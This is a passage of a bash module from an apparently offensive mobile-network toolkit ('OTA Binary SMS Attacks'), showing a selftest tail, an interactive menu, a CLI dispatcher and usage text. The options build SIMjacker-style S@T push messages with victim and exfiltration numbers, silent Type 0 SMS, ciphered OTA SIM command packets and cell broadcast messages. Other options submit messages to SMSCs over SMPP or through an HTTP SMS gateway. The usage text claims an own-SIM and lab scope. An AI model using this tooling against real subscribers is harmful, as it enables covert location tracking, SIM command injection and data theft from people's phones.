    chk smpp-tls-port       "$(fld "$tlsout" port_asked)" "3550"
    chk smpp-tls-framing    "$(printf '%s\n' "$tlsout" | grep -c 'command_length still counts')" "1"
    chk smpp-tls-terminate  "$(fld "$tlsout" build)" "yes, --smpp-build emits PDUs that are byte-identical with or without TLS"
    chk smpp-tls-verdict    "$(fld "$tlsout" verdict)" "smpp_tls_admitted_by_shape"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

otasm_menu() {
    while true; do
        banner
        echo "  === OTA Binary SMS Attacks ==="
        echo
        cat <<'M'
  [1]  Build an SPI
  [2]  Parse / audit an SPI
  [3]  Build a command packet
  [4]  Parse a command packet
  [5]  Counter / replay check
  [6]  Plan (handoff)
  --- TS 23.040 TP layer ---
  [7]  Decode a TP-PID (incl. Type 0)
  [8]  Decode / build a TP-DCS
  [9]  Build / decode a TP-SCTS
  [10] Build / decode an address field
  [11] GSM 7-bit packing KAT, pack and unpack text
  [12] Build an SMS-DELIVER / SMS-SUBMIT TPDU
  [13] Parse a TPDU
  [14] Build / audit a Type 0 silent SMS
  [15] Decode TP-FCS / TP-ST
  --- TS 31.115 secured command packet ---
  [16] Build a ciphered command packet with its CC
  [17] Parse it back and check the CC
  --- S@T push / WIB ---
  [18] Build an S@T push (deck of 0x2d macros in TAR 505348, SMS TP-PID 0x7F)
  [19] WIB push (refused: no citable command encoding)
  --- SMPP 3.4 (ESME <-> SMSC, TCP 2775) ---
  [20] Build an SMPP PDU (submit_sm, deliver_sm, bind_transceiver)
  [21] Parse an SMPP PDU with field offsets
  [22] Build the matching SMPP response
  [23] Name an SMPP command id and its direction
  [24] Send a PDU to an SMSC over TCP (bind + submit, no SIM)
  [0]  back
M
        read -rp "  choice> " c || return 0
        case "$c" in
            1) read -rp "  rccds(0-3)> " a; read -rp "  cipher(0-1)> " b; read -rp "  counter(0-3)> " d
               otasm_spi_build "$a" "$b" "$d"; echo; read -rp "  enter " _ ;;
            2) read -rp "  spi (hex or decimal)> " s; otasm_spi_parse "$s"; read -rp "  enter " _ ;;
            3) read -rp "  TAR(6hex)> " t; read -rp "  counter> " n; read -rp "  SPI(4hex)> " s
               read -rp "  KIc(2hex)> " k1; read -rp "  KID(2hex)> " k2; read -rp "  data hex> " dd
               otasm_packet_build 01 "$t" "$n" "$s" "$k1" "$k2" "$dd"; echo; read -rp "  enter " _ ;;
            4) read -rp "  packet hex> " p; otasm_packet_parse "$p"; read -rp "  enter " _ ;;
            5) read -rp "  counter> " n; read -rp "  RE> " r; read -rp "  mode 0-3> " m
               otasm_counter_check "$n" "$r" "${m:-0}"; read -rp "  enter " _ ;;
            6) otasm_plan; read -rp "  enter " _ ;;
            16) read -rp "  TAR(6hex)> " t; read -rp "  counter> " n; read -rp "  SPI(4hex)> " s
                read -rp "  KIc(2hex)> " k1; read -rp "  KID(2hex)> " k2; read -rp "  APDU hex> " dd
                read -rsp "  KIc key hex (hidden, empty for none)> " kk; echo
                read -rsp "  KID key hex (hidden, empty for none)> " kd; echo
                OTASM_KIC_KEY="$kk" OTASM_KID_KEY="$kd" \
                    otasm_packet_sms_build "$t" "$n" "$s" "$k1" "$k2" "$dd"
                echo; read -rp "  enter " _ ;;
            17) read -rp "  packet hex> " p
                read -rsp "  KIc key hex (hidden, empty for none)> " kk; echo
                read -rsp "  KID key hex (hidden, empty for none)> " kd; echo
                OTASM_KIC_KEY="$kk" OTASM_KID_KEY="$kd" otasm_packet_sms_parse "$p"
                read -rp "  enter " _ ;;
            18) read -rp "  victim MSISDN (blank = 15551234567)> " vv
                read -rp "  exfil MSISDN (blank = 15559876543)> " ee
                read -rp "  SPI (blank = 0000 no security)> " ss
                otasm_sat_push_build "${vv:-}" "${ee:-}" "${ss:-}"
                read -rp "  enter " _ ;;
            19) otasm_wib_push; read -rp "  enter " _ ;;
            7) read -rp "  TP-PID hex> " p; otasm_tp_pid_parse "$p"; read -rp "  enter " _ ;;
            8) read -rp "  [p]arse or [b]uild> " m
               if [[ "$m" == b ]]; then
                   read -rp "  alphabet 7bit|8bit|ucs2> " al; read -rp "  class none|0|1|2|3> " cl
                   read -rp "  compressed 0|1> " cp; read -rp "  autodelete 0|1> " ad
                   otasm_tp_dcs_build "$al" "$cl" "${cp:-0}" "${ad:-0}"
               else
                   read -rp "  TP-DCS hex> " dd; otasm_tp_dcs_parse "$dd"
               fi; read -rp "  enter " _ ;;
            9) read -rp "  [p]arse hex7 or [b]uild YYMMDDhhmmss> " m
               if [[ "$m" == b ]]; then
                   read -rp "  YYMMDDhhmmss> " ts; read -rp "  tz quarter hours> " tz
                   otasm_tp_scts_build "$ts" "${tz:-0}"
               else
                   otasm_tp_scts_parse "$m"
               fi; read -rp "  enter " _ ;;
           10) read -rp "  [p]arse hex or [b]uild ton/npi/digits> " m
               if [[ "$m" == b ]]; then
                   read -rp "  ton 0-7> " tn; read -rp "  npi 0-9> " np; read -rp "  digits> " dg
                   otasm_tp_addr_build "${tn:-0}" "${np:-0}" "$dg"
               else
                   otasm_tp_addr_parse "$m"
               fi; read -rp "  enter " _ ;;
           11) otasm_tp_packing_kat
               read -rp "  pack text (blank to skip)> " tx
               if [[ -n "$tx" ]]; then
                   local packed; packed=$(otasm_tp_pack_text "$tx")
                   printf 'packed\t%s\n' "$packed"
                   printf 'back\t%s\n' "$(otasm_tp_unpack_text "$packed" "${#tx}")"
               fi
               read -rp "  TP-UD octets to read back (blank to skip)> " uh
               if [[ -n "$uh" ]]; then read -rp "  septet count> " sn; otasm_tp_unpack_text "$uh" "$sn"; fi
               read -rp "  enter " _ ;;
           12) read -rp "  [d]eliver or [s]ubmit> " m
               if [[ "$m" == s ]]; then
                   read -rp "  TP-DA address hex> " ad; read -rp "  TP-PID hex> " pp; read -rp "  TP-DCS hex> " dc
                   read -rp "  TP-UD hex> " uu; read -rp "  TP-UDL> " ul; read -rp "  TP-MR> " mr
                   otasm_tpdu_build_submit "$ad" "$pp" "$dc" "$uu" "$ul" "${mr:-0}" 0 "" 0
               else
                   read -rp "  TP-OA address hex> " ad; read -rp "  TP-PID hex> " pp; read -rp "  TP-DCS hex> " dc
                   read -rp "  TP-SCTS hex14> " st; read -rp "  TP-UD hex> " uu; read -rp "  TP-UDL> " ul
                   otasm_tpdu_build_deliver "$ad" "$pp" "$dc" "$st" "$uu" "$ul" 0
               fi; read -rp "  enter " _ ;;
           13) read -rp "  TPDU hex> " tp; otasm_tpdu_parse "$tp"; read -rp "  enter " _ ;;
           14) read -rp "  [b]uild or [a]udit hex> " m
               if [[ "$m" == b ]]; then
                   read -rp "  originator address hex (blank = intl 0000)> " oa
                   read -rp "  TP-SCTS hex14 (blank = now)> " st
                   otasm_type0_build "$oa" "$st"
               else
                   otasm_type0_audit "$m"
               fi; read -rp "  enter " _ ;;
           15) read -rp "  f<hex> for TP-FCS, s<hex> for TP-ST> " m
               if [[ "${m:0:1}" == f ]]; then otasm_tp_fcs_parse "${m:1}"; else otasm_tp_st_parse "${m:1}"; fi
               read -rp "  enter " _ ;;
            20) read -rp "  pdu submit_sm|deliver_sm|bind_transceiver> " p
                case "$p" in
                    bind_transceiver)
                        read -rp "  system_id> " si
                        read -rsp "  password (hidden)> " pw; echo
                        otasm_smpp_build "$p" --system-id "$si" --password "$pw" ;;
                    *)
                        read -rp "  source_addr> " sa
                        read -rp "  destination_addr> " da
                        read -rp "  short_message hex (blank = none)> " mh
                        read -rp "  data_coding hex (blank = 00)> " dc
                        read -rp "  registered_delivery hex (blank = 00)> " rg
                        otasm_smpp_build "$p" --src "$sa" --dst "$da" --msg "$mh" --dcs "${dc:-00}" --rd "${rg:-00}" ;;
                esac
                echo; read -rp "  enter " _ ;;
            21) read -rp "  PDU hex> " ph; otasm_smpp_parse "$ph"; read -rp "  enter " _ ;;
            22) read -rp "  request PDU hex> " rh
                read -rp "  command_status hex (blank = 0)> " sh
                if [[ -n "$sh" ]]; then otasm_smpp_response "$rh" --status "$sh"
                else otasm_smpp_response "$rh"; fi
                read -rp "  enter " _ ;;
            23) read -rp "  command name or id> " q; otasm_smpp_pdu "$q"; read -rp "  enter " _ ;;
            24)
                read -rp "  SMSC host> " sh_host
                read -rp "  port [2775]> " sh_port
                read -rp "  system_id (blank for --no-bind)> " sh_sid
                read -rp "  password> " sh_pw
                read -rp "  source address> " sh_src
                read -rp "  destination address> " sh_dst
                read -rp "  message text> " sh_text
                local -a sh_args=(--host "$sh_host" --src "$sh_src" --dst "$sh_dst")
                [[ -n "$sh_port" ]] && sh_args+=(--port "$sh_port")
                [[ -n "$sh_text" ]] && sh_args+=(--text "$sh_text")
                if [[ -n "$sh_sid" ]]; then
                    sh_args+=(--system-id "$sh_sid")
                    OTASM_SMPP_PASSWORD="$sh_pw" otasm_smpp_send "${sh_args[@]}"
                else
                    sh_args+=(--no-bind)
                    otasm_smpp_send "${sh_args[@]}"
                fi
                read -rp "  enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

otasm_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)     otasm_status_tsv ;;
        --spi-build)      otasm_spi_build "${1:-0}" "${2:-0}" "${3:-0}" "${4:-0}" "${5:-0}" "${6:-0}" "${7:-0}" ;;
        --spi)            otasm_spi_parse "${1:-}" ;;
        --key)            otasm_cmd_key "${1:-}" "${2:-}" ;;
        --packet)         otasm_packet_build "${1:-01}" "${2:-000000}" "${3:-0}" "${4:-B800}" "${5:-01}" "${6:-01}" "${7:-}" "${8:-01}" "${9:-01}" ;;
        --parse-packet)   otasm_packet_parse "${1:-}" ;;
        --packet-sms)     otasm_packet_sms_build "${1:-000000}" "${2:-0}" "${3:-1600}" "${4:-15}" "${5:-25}" "${6:-}" ;;
        --parse-packet-sms) otasm_packet_sms_parse "${1:-}" ;;
        --parse-resp-sms) otasm_resp_sms_parse "$@" ;;
        --counter-check)  otasm_counter_check "${1:-}" "${2:-}" "${3:-0}" ;;
        --tp-pid)         otasm_tp_pid_parse "${1:-}" ;;
        --tp-dcs)         otasm_tp_dcs_parse "${1:-}" ;;
        --tp-dcs-build)   otasm_tp_dcs_build "${1:-7bit}" "${2:-none}" "${3:-0}" "${4:-0}" ;;
        --tp-fcs)         otasm_tp_fcs_parse "${1:-}" ;;
        --tp-st)          otasm_tp_st_parse "${1:-}" ;;
        --tp-scts-build)  otasm_tp_scts_build "${1:-}" "${2:-0}" ;;
        --tp-scts)        otasm_tp_scts_parse "${1:-}" ;;
        --tp-addr-build)  otasm_tp_addr_build "${1:-0}" "${2:-0}" "${3:-}" ;;
        --tp-addr)        otasm_tp_addr_parse "${1:-}" ;;
        --tp-ud-build)    otasm_tp_pack_text "${1:-}" ;;
        --tp-ud-read)     otasm_tp_unpack_text "${1:-}" "${2:-0}" ;;
        --tp-kat)         otasm_tp_packing_kat ;;
        --tpdu-parse)     otasm_tpdu_parse "${1:-}" ;;
        --tpdu-deliver)   otasm_tpdu_build_deliver "${1:-}" "${2:-00}" "${3:-00}" "${4:-}" "${5:-}" "${6:-0}" "${7:-0}" ;;
        --tpdu-submit)    otasm_tpdu_build_submit "${1:-}" "${2:-00}" "${3:-00}" "${4:-}" "${5:-0}" "${6:-0}" "${7:-0}" "${8:-}" "${9:-0}" ;;
        --smsc-wrap)      otasm_smsc_wrap "${1:-}" "${2:-}" ;;
        --cb-build)       otasm_cb_build "${1:-}" "${@:2}" ;;
        --cb-blocks)      otasm_cb_blocks "${1:-}" ;;
        --cb-command)     otasm_cb_command "${1:-}" "${2:-}" ;;
        --cb-serial)      otasm_cb_serial "${1:-0}" "${2:-0}" "${3:-0}" ;;
        --type0-build)    otasm_type0_build "${1:-}" "${2:-}" "${3:-00}" ;;
        --type0)          otasm_type0_audit "${1:-}" ;;
        --sat-push)       otasm_sat_push_build "${1:-}" "${2:-}" "${3:-}" ;;
        --sat-concat)     otasm_sat_concat "${1:-}" "${@:2}" ;;
        --sat-subst)      otasm_sat_substitution "${1:-}" "${2:-}" ;;
        --sat-varref)     otasm_sat_varref "${1:-}" ;;
        --sat-audit)      otasm_sat_audit "${1:-}" ;;
        --sat-commands)   otasm_sat_catalogue ;;
        --wib-push)       otasm_wib_push ;;
        --plan)           otasm_plan ;;
        --plan-tp)        otasm_plan_tp ;;
        --smpp-build)     otasm_smpp_build "${1:-}" "${@:2}" ;;
        --smpp-parse)     otasm_smpp_parse "${1:-}" ;;
        --smpp-tlv)       otasm_smpp_tlv_build "${1:-}" "${2:-}" ;;
        --smpp-tls)       otasm_smpp_tls "${1:-}" ;;
        --smpp-response)  otasm_smpp_response "${1:-}" "${@:2}" ;;
        --smpp-pdu)       otasm_smpp_pdu "${1:-}" ;;
        --smpp-send)      otasm_smpp_send "$@" ;;
        --http-send)      otasm_http_send "$@" ;;
        --http-devices)   otasm_http_devices "$@" ;;
        --selftest)       otasm_selftest ;;
        --menu)           otasm_menu ;;
        *)
            cat >&2 <<EOF
OTA Binary SMS Attacks — TS 23.048 command packet construction and key/counter audit

Usage: $0 COMMAND
  --status-tsv                       module state as TSV
  --spi-build <rccds> <cipher> <counter> [por...]
  --spi <hex|dec>                    parse and audit an SPI
  --packet <cpi> <tar> <counter> <spi> <kic> <kid> <data> [chi] [cmd]
  --parse-packet <hex>               decode a command packet
  --packet-sms <tar> <counter> <spi> <kic> <kid> <apdu-hex>
                                     TS 31.115 SMS packet with the SPI's
                                     security actually applied; keys come from
                                     OTASM_KIC_KEY / OTASM_KID_KEY
  --parse-packet-sms <hex>           decrypt it and check its CC
  --parse-resp-sms [<spi>] <hex>      read the card's Response Packet (RPL/RHL, status, CC)
  --counter-check <counter> <RE> [mode]   replay decision per SPI mode
  --tp-kat                           GSM 7-bit packing KAT (TS 23.038 §6.1.2.1.1)
  --tp-pid <hex>                     decode TP-PID, including Type 0 / triggering
  --tp-dcs <hex>                     decode TP-DCS per TS 23.038 §4
  --tp-dcs-build <alpha> <class> [compressed] [autodelete]
  --tp-fcs <hex>                     decode a TP-Failure-Cause
  --tp-st <hex>                      decode a TP-Status
  --tp-scts-build <YYMMDDhhmmss> [tz-quarters]
  --tp-scts <hex7>                   decode TP-SCTS
  --tp-addr-build <ton> <npi> <digits>
  --tp-addr <hex>                    decode an address field
  --tp-ud-build <text>               pack text into TP-UD octets
  --tp-ud-read <hex> <septets>       unpack TP-UD back to text
  --tpdu-parse <hex>                 decode a complete TPDU
  --tpdu-deliver <oa> <pid> <dcs> <scts> <ud> <udl> [flagbits]
  --tpdu-submit <da> <pid> <dcs> <ud> <udl> [mr] [vpf] [vp] [flagbits]
  --smsc-wrap <sca-hex> <tpdu-hex>   prepend an SMSC address field
  --cb-build <text> [--message-id HEX4] [--serial HEX4] [--dcs HEX2]
                                  build a TS 23.041 CB message (7-bit or 8-bit)
  --cb-blocks <cb-message-hex>     split it into CBCH blocks (TS 44.012 6.1)
  --cb-command <cb-message-hex> <message-id-hex4>
                                  the CBC WRITE-REPLACE that carries it (48.049)
  --cb-serial <gs> <code> <update> build a CB serial number
  --type0-build [oa] [scts] [dcs]    build a Type 0 silent SMS-DELIVER
  --type0 <hex>                      audit a TPDU for the Type 0 properties
  --sat-audit <push_hex>             read an S@T push back: the deck, the card,
                                     every macro, and what each command makes
                                     the card do
  --sat-commands                     the S@T commands this tree builds, with
                                     the clause each rests on
  --sat-push [<victim>] [<exfil>] [<spi>]
  --sat-concat <dest-var> <var>...   S@T CONCATENATE byte code (01.00 6.2.4)
  --sat-varref <var>                 S@T variable reference TLV (01.00 5.5.1)
  --sat-subst <tag> <var>            S@T substitution: value lives in <var> (01.00 5.4.8)
                                     build the SIMjacker-shape S@T push: a S@T
                                     deck of 0x2d STK macros in a TS 31.115
                                     packet (TAR 505348) inside an SMS-SUBMIT
                                     with TP-PID 0x7F, TP-DCS 0xF6 and UDH 70
  --wib-push                         refused: no citable WIB command encoding
  --plan                             own-SIM delivery handoff plan
  --plan-tp                          loopback-SMSC handoff plan for the TP layer
  --smpp-build <pdu> [flags]         build submit_sm, deliver_sm or
                                     bind_transceiver; fields are --src --dst
                                     --msg (hex) --dcs --rd --service-type
                                     --src-ton --src-npi --dst-ton --dst-npi
                                     --seq, or --system-id --password
                                     --system-type --interface-version; an
                                     integer flag is decimal unless 0x-prefixed
  --smpp-parse <hex>                 decode the header, then one row per body
                                     field with its octet offset, then any
                                     optional parameters (TLVs)
  --smpp-tlv <tag-name|0xNNNN> <hex> compose one optional parameter and print
                                     the octets to append, length excluded
  --smpp-tls [port]                  what TLS changes around an SMPP PDU, and
                                     what this tree cannot do without a session
  --smpp-response <request> [--status n]
                                     build the matching *_resp PDU, same
                                     sequence number, response command id
  --smpp-pdu <name|id>               name a command id and its direction
  --smpp-send --host H [--port 2775] [--system-id ID --password PW]
              [--src S] --dst D (--text T | --msg HEX) [--dcs h] [--rd h]
              [--seq n] [--timeout s] [--no-bind] [--dry-run]
                                     open a TCP session to an SMSC -- bind_transceiver
                                     when an identity is given, then submit_sm --
                                     and read the response. No SIM is involved:
                                     an SMSC authenticates the ESME by
                                     system_id/password (SMPP 3.4 5.2.1).
                                     --text packs GSM 7-bit, --dry-run builds only.
                                     Password from OTASM_SMPP_PASSWORD keeps it
                                     out of the process list.
                                     A stand-in SMSC for a run on this box:
                                       python3 tools/smpp_client.py --serve --port 2775
                                     it answers bind and submit and routes nothing.
  --http-send --api textbee --dst D --text T [--api-key K]
              [--device-id ID] [--base URL] [--timeout s] [--dry-run] [--raw]
                                     POST the message to an HTTP SMS gateway. An
                                     Android phone with a SIM on the account does
                                     the transmitting, so this path does need a
                                     SIM -- just not one plugged in here (textbee
                                     openapi, SendSMSRequestDTO: message,
                                     recipients, optional deviceId, header
                                     x-api-key). OTASM_HTTP_KEY keeps the key off
                                     the command line; --dry-run prints the URL,
                                     the body and no request.
  --http-devices --api textbee [--api-key K] [--base URL]
                                     list the devices this key can send from, so
                                     --device-id is read rather than guessed
  --selftest                         verify SPI, packet and replay logic
  --menu                             interactive menu

Scope: own-SIM and lab construction plus vulnerability detection. Affecting a
SIM you do not hold requires that SIM's OTA keys, which this module never holds.
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    : "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
    : "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
    : "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
    : "${STATE_DIR:=$IMSISTING_ROOT/state}"
    mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    otasm_cli_main "$@"
fi
